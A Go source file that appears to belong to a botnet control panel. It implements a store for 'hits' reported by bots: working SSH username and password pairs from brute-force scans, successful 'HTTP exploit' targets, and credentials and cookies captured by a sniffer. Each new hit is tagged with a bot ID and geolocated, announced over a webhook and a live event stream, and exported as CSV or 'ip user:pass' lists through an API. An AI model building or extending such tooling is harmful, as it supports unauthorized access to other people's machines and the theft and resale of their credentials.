package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ============================================================================
// UNIFIED HIT STORE
// Append-only JSONL persistence, map-based O(1) dedup, batched 2s flush,
// session tagging, and unified API for SSH / HTTP / Sniffer hits.
// ============================================================================

// Hit is the unified structure stored in the JSONL file and served via API.
type Hit struct {
	Timestamp time.Time `json:"t"`
	Module    string    `json:"mod"`              // "ssh", "http", "sniff"
	SessionID string    `json:"sid,omitempty"`     // scan session tag
	IP        string    `json:"ip"`
	Country   string    `json:"country,omitempty"`
	BotID     string    `json:"botID,omitempty"`

	// SSH-specific
	User string `json:"user,omitempty"`
	Pass string `json:"pass,omitempty"`

	// HTTP-specific
	Status string `json:"status,omitempty"`

	// Sniffer-specific
	SniffType string `json:"sniffType,omitempty"` // "post", "basic", "cookie", "url"
}

// dedupKey returns a string key used for O(1) dedup lookup.
func (h *Hit) dedupKey() string {
	switch h.Module {
	case "ssh":
		return "ssh|" + h.IP + "|" + h.User + "|" + h.Pass
	case "http":
		return "http|" + h.IP + "|" + h.Status
	case "sniff":
		return "sniff|" + h.IP + "|" + h.SniffType + "|" + h.User + "|" + h.Pass
	default:
		return h.Module + "|" + h.IP
	}
}

// HitStore is the singleton unified store.
type HitStore struct {
	mu     sync.Mutex
	hits   []Hit              // all hits in memory
	dedup  map[string]struct{} // O(1) dedup set
	batch  []Hit              // pending writes (not yet flushed to disk)
	file   string             // JSONL file path
	stopCh chan struct{}

	// Current session IDs per module (set when a scan starts)
	sessions     map[string]string // module → sessionID
	sessionsLock sync.RWMutex

	// Aggregate counters for fast stats (avoid counting full slice)
	counters     map[string]int // "ssh", "http", "sniff"
	countersLock sync.RWMutex
}

var hitStore *HitStore

// InitHitStore creates the global hit store, loads existing JSONL data, and
// starts the background flush goroutine.
func InitHitStore() {
	hitStore = &HitStore{
		dedup:    make(map[string]struct{}),
		file:     "db/hits.jsonl",
		stopCh:   make(chan struct{}),
		sessions: make(map[string]string),
		counters: make(map[string]int),
	}
	hitStore.load()
	go hitStore.flushLoop()
}

// load reads the existing JSONL file and rebuilds the in-memory state.
func (s *HitStore) load() {
	// Migrate old JSON files into unified JSONL
	s.migrateOldJSON()

	f, err := os.Open(s.file)
	if err != nil {
		return
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	scanner.Buffer(make([]byte, 0, 4096), 1024*1024) // 1MB max line
	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}
		var h Hit
		if err := json.Unmarshal(line, &h); err != nil {
			continue
		}
		key := h.dedupKey()
		s.dedup[key] = struct{}{}
		s.hits = append(s.hits, h)
		s.counters[h.Module]++
	}
	logMsg("[HITS] Loaded %d hits from %s", len(s.hits), s.file)
}

// migrateOldJSON reads old ssh_hits.json / http_hits.json and converts them
// into the JSONL file, then renames the old files to .bak.
func (s *HitStore) migrateOldJSON() {
	// Skip if JSONL already exists
	if _, err := os.Stat(s.file); err == nil {
		return
	}

	type oldSSH struct {
		IP        string    `json:"ip"`
		User      string    `json:"user"`
		Pass      string    `json:"pass"`
		Country   string    `json:"country"`
		Timestamp time.Time `json:"timestamp"`
	}
	type oldHTTP struct {
		IP        string    `json:"ip"`
		Status    string    `json:"status"`
		Timestamp time.Time `json:"timestamp"`
	}

	var migrated int

	// Migrate SSH hits
	if data, err := os.ReadFile("db/ssh_hits.json"); err == nil && len(data) > 2 {
		var old []oldSSH
		if json.Unmarshal(data, &old) == nil {
			for _, o := range old {
				h := Hit{
					Timestamp: o.Timestamp,
					Module:    "ssh",
					IP:        o.IP,
					Country:   o.Country,
					User:      o.User,
					Pass:      o.Pass,
				}
				key := h.dedupKey()
				if _, exists := s.dedup[key]; !exists {
					s.dedup[key] = struct{}{}
					s.hits = append(s.hits, h)
					s.batch = append(s.batch, h)
					s.counters["ssh"]++
					migrated++
				}
			}
			os.Rename("db/ssh_hits.json", "db/ssh_hits.json.bak")
		}
	}

	// Migrate HTTP hits
	if data, err := os.ReadFile("db/http_hits.json"); err == nil && len(data) > 2 {
		var old []oldHTTP
		if json.Unmarshal(data, &old) == nil {
			for _, o := range old {
				h := Hit{
					Timestamp: o.Timestamp,
					Module:    "http",
					IP:        o.IP,
					Status:    o.Status,
				}
				key := h.dedupKey()
				if _, exists := s.dedup[key]; !exists {
					s.dedup[key] = struct{}{}
					s.hits = append(s.hits, h)
					s.batch = append(s.batch, h)
					s.counters["http"]++
					migrated++
				}
			}
			os.Rename("db/http_hits.json", "db/http_hits.json.bak")
		}
	}

	// Flush migrated data immediately
	if migrated > 0 {
		s.flushBatch()
		logMsg("[HITS] Migrated %d hits from old JSON files", migrated)
	}
}

// Record adds a hit to the store. Dedup is O(1). Disk writes are batched.
// Returns true if the hit was new (not a duplicate).
func (s *HitStore) Record(h Hit) bool {
	if h.Timestamp.IsZero() {
		h.Timestamp = time.Now()
	}
	// Attach current session ID for this module
	s.sessionsLock.RLock()
	if sid, ok := s.sessions[h.Module]; ok {
		h.SessionID = sid
	}
	s.sessionsLock.RUnlock()

	// GeoIP if missing
	if h.Country == "" && h.IP != "" {
		h.Country = lookupGeoIP(h.IP)
	}

	key := h.dedupKey()

	s.mu.Lock()
	if _, exists := s.dedup[key]; exists {
		s.mu.Unlock()
		return false
	}
	s.dedup[key] = struct{}{}
	s.hits = append(s.hits, h)
	s.batch = append(s.batch, h)
	s.mu.Unlock()

	s.countersLock.Lock()
	s.counters[h.Module]++
	s.countersLock.Unlock()

	return true
}

// flushLoop runs every 2 seconds and writes pending hits to the JSONL file.
func (s *HitStore) flushLoop() {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			s.mu.Lock()
			s.flushBatch()
			s.mu.Unlock()
		case <-s.stopCh:
			// Final flush on shutdown
			s.mu.Lock()
			s.flushBatch()
			s.mu.Unlock()
			return
		}
	}
}

// flushBatch appends pending hits to the JSONL file. Caller must hold s.mu.
func (s *HitStore) flushBatch() {
	if len(s.batch) == 0 {
		return
	}
	f, err := os.OpenFile(s.file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		logMsg("[HITS] Failed to open %s: %v", s.file, err)
		return
	}
	w := bufio.NewWriter(f)
	for _, h := range s.batch {
		line, err := json.Marshal(h)
		if err != nil {
			continue
		}
		w.Write(line)
		w.WriteByte('\n')
	}
	w.Flush()
	f.Close()
	s.batch = s.batch[:0]
}

// SetSession tags future hits for a module with a session ID.
func (s *HitStore) SetSession(module, sessionID string) {
	s.sessionsLock.Lock()
	s.sessions[module] = sessionID
	s.sessionsLock.Unlock()
}

// ClearSession removes the session tag for a module.
func (s *HitStore) ClearSession(module string) {
	s.sessionsLock.Lock()
	delete(s.sessions, module)
	s.sessionsLock.Unlock()
}

// Query returns hits filtered by module, optional session ID, and time range.
// Results are returned newest-first.
func (s *HitStore) Query(module, sessionID string, since time.Time, limit int) []Hit {
	s.mu.Lock()
	defer s.mu.Unlock()

	if limit <= 0 {
		limit = 500
	}

	var result []Hit
	// Walk backwards for newest-first
	for i := len(s.hits) - 1; i >= 0 && len(result) < limit; i-- {
		h := s.hits[i]
		if module != "" && h.Module != module {
			continue
		}
		if sessionID != "" && h.SessionID != sessionID {
			continue
		}
		if !since.IsZero() && h.Timestamp.Before(since) {
			continue
		}
		result = append(result, h)
	}
	return result
}

// Stats returns aggregate counters per module.
func (s *HitStore) Stats() map[string]int {
	s.countersLock.RLock()
	defer s.countersLock.RUnlock()
	out := make(map[string]int, len(s.counters))
	for k, v := range s.counters {
		out[k] = v
	}
	return out
}

// Count returns the total number of hits for a module (or all if module is "").
func (s *HitStore) Count(module string) int {
	s.countersLock.RLock()
	defer s.countersLock.RUnlock()
	if module == "" {
		total := 0
		for _, v := range s.counters {
			total += v
		}
		return total
	}
	return s.counters[module]
}

// Clear removes all hits for a module (or all if module is "").
// Rewrites the JSONL file without the cleared module's entries.
func (s *HitStore) Clear(module string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if module == "" {
		s.hits = nil
		s.dedup = make(map[string]struct{})
		s.batch = nil
		s.countersLock.Lock()
		s.counters = make(map[string]int)
		s.countersLock.Unlock()
		os.Remove(s.file)
		return
	}

	// Keep hits from other modules
	var kept []Hit
	newDedup := make(map[string]struct{})
	for _, h := range s.hits {
		if h.Module == module {
			continue
		}
		kept = append(kept, h)
		newDedup[h.dedupKey()] = struct{}{}
	}
	s.hits = kept
	s.dedup = newDedup
	s.batch = nil

	// Recount
	s.countersLock.Lock()
	s.counters = make(map[string]int)
	for _, h := range s.hits {
		s.counters[h.Module]++
	}
	s.countersLock.Unlock()

	// Rewrite file
	s.rewriteFile()
}

// rewriteFile rewrites the entire JSONL file from in-memory hits. Caller must hold s.mu.
func (s *HitStore) rewriteFile() {
	tmp := s.file + ".tmp"
	f, err := os.OpenFile(tmp, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
	if err != nil {
		return
	}
	w := bufio.NewWriter(f)
	for _, h := range s.hits {
		line, _ := json.Marshal(h)
		w.Write(line)
		w.WriteByte('\n')
	}
	w.Flush()
	f.Close()
	os.Rename(tmp, s.file)
}

// ExportCSV returns all hits for a module as CSV bytes.
func (s *HitStore) ExportCSV(module string) []byte {
	hits := s.Query(module, "", time.Time{}, 0)
	var b strings.Builder
	switch module {
	case "ssh":
		b.WriteString("IP,Country,User,Pass,Session,Bot,Timestamp\n")
		for _, h := range hits {
			b.WriteString(fmt.Sprintf("%s,%s,%s,%s,%s,%s,%s\n",
				h.IP, h.Country, h.User, h.Pass, h.SessionID, h.BotID,
				h.Timestamp.Format(time.RFC3339)))
		}
	case "http":
		b.WriteString("IP,Country,Status,Session,Bot,Timestamp\n")
		for _, h := range hits {
			b.WriteString(fmt.Sprintf("%s,%s,%s,%s,%s,%s\n",
				h.IP, h.Country, h.Status, h.SessionID, h.BotID,
				h.Timestamp.Format(time.RFC3339)))
		}
	case "sniff":
		b.WriteString("IP,Country,Type,User,Pass,Session,Bot,Timestamp\n")
		for _, h := range hits {
			b.WriteString(fmt.Sprintf("%s,%s,%s,%s,%s,%s,%s,%s\n",
				h.IP, h.Country, h.SniffType, h.User, h.Pass, h.SessionID, h.BotID,
				h.Timestamp.Format(time.RFC3339)))
		}
	default:
		b.WriteString("Module,IP,Country,Timestamp\n")
		for _, h := range hits {
			b.WriteString(fmt.Sprintf("%s,%s,%s,%s\n",
				h.Module, h.IP, h.Country,
				h.Timestamp.Format(time.RFC3339)))
		}
	}
	return []byte(b.String())
}

// ExportTxt returns ip user:pass lines for SSH hits (or ip status for HTTP).
func (s *HitStore) ExportTxt(module string) []byte {
	hits := s.Query(module, "", time.Time{}, 0)
	var b strings.Builder
	for _, h := range hits {
		switch h.Module {
		case "ssh":
			b.WriteString(fmt.Sprintf("%s %s:%s\n", h.IP, h.User, h.Pass))
		case "http":
			b.WriteString(fmt.Sprintf("%s %s\n", h.IP, h.Status))
		case "sniff":
			b.WriteString(fmt.Sprintf("%s %s %s:%s\n", h.IP, h.SniffType, h.User, h.Pass))
		}
	}
	return []byte(b.String())
}

// ============================================================================
// CONVENIENCE WRAPPERS — drop-in replacements for the old Record functions
// ============================================================================

// RecordSSHHitNew records an SSH hit in the unified store and broadcasts SSE.
func RecordSSHHitNew(ip, user, pass, botID string) {
	h := Hit{
		Module: "ssh",
		IP:     ip,
		User:   user,
		Pass:   pass,
		BotID:  botID,
	}
	if !hitStore.Record(h) {
		return // duplicate
	}
	// Broadcast SSE + activity + webhook (same as before)
	country := h.Country
	PushActivity("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
	sendWebhook("scan", fmt.Sprintf("SSH hit: %s %s:%s (%s)", ip, user, pass, country))
	if data, err := json.Marshal(h); err == nil {
		broadcastSSE("ssh_hit", string(data))
	}
}

// RecordHTTPExploitHitNew records an HTTP exploit hit in the unified store.
func RecordHTTPExploitHitNew(ip, status, botID string) {
	h := Hit{
		Module: "http",
		IP:     ip,
		Status: status,
		BotID:  botID,
	}
	if !hitStore.Record(h) {
		return // duplicate
	}
	PushActivity("scan", fmt.Sprintf("HTTP exploit: %s (%s)", ip, status))
	if data, err := json.Marshal(h); err == nil {
		broadcastSSE("http_hit", string(data))
	}
}

// RecordSniffHit records a sniffer credential hit in the unified store.
func RecordSniffHit(ip, sniffType, user, pass, botID string) {
	h := Hit{
		Module:    "sniff",
		IP:        ip,
		SniffType: sniffType,
		User:      user,
		Pass:      pass,
		BotID:     botID,
	}
	if !hitStore.Record(h) {
		return
	}
	if data, err := json.Marshal(h); err == nil {
		broadcastSSE("sniff_hit", string(data))
	}
}

// ============================================================================
// UNIFIED /api/hits ENDPOINT
// GET  /api/hits?mod=ssh&sid=abc&since=unix&limit=500  → query hits
// GET  /api/hits/stats                                  → aggregate counters
// GET  /api/hits/export?mod=ssh&format=csv              → download
// DELETE /api/hits?mod=ssh                              → clear module
// ============================================================================

func handleAPIHits(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/api/hits")
	path = strings.TrimPrefix(path, "/")

	switch {
	case path == "stats":
		writeJSON(w, 200, hitStore.Stats())

	case path == "export":
		mod := r.URL.Query().Get("mod")
		format := r.URL.Query().Get("format")
		if mod == "" {
			writeJSON(w, 400, map[string]interface{}{"error": "mod parameter required"})
			return
		}
		switch format {
		case "txt":
			w.Header().Set("Content-Type", "text/plain")
			w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s_hits.txt", mod))
			w.Write(hitStore.ExportTxt(mod))
		default:
			w.Header().Set("Content-Type", "text/csv")
			w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s_hits.csv", mod))
			w.Write(hitStore.ExportCSV(mod))
		}

	case path == "" || path == "/":
		if r.Method == "DELETE" {
			mod := r.URL.Query().Get("mod")
			hitStore.Clear(mod)
			writeJSON(w, 200, map[string]interface{}{"ok": true})
			return
		}

		mod := r.URL.Query().Get("mod")
		sid := r.URL.Query().Get("sid")
		limit := 500
		if v := r.URL.Query().Get("limit"); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				limit = n
			}
		}
		var since time.Time
		if v := r.URL.Query().Get("since"); v != "" {
			if ts, err := strconv.ParseInt(v, 10, 64); err == nil {
				since = time.Unix(ts, 0)
			}
		}
		hits := hitStore.Query(mod, sid, since, limit)
		if hits == nil {
			hits = []Hit{}
		}
		writeJSON(w, 200, hits)

	default:
		http.Error(w, "not found", 404)
	}
}
